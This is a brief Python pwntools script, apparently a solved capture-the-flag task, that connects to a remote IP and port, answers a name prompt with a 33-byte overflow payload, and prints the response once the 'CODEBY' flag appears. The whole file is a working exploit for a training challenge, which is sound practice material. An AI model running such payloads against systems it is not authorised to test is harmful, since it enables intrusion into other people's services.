# resolved
# coding=utf-8
from pwn import *

host = "62.173.140.174"
port = 17000
r = remote(host, port)
payload = b'y'*33
a = True

while a:
    answer = r.recv().decode('utf-8')
    if "CODEBY" in answer:
        print(answer)
        a = False
    if 'Enter your name:' in answer:
        r.sendline(payload)
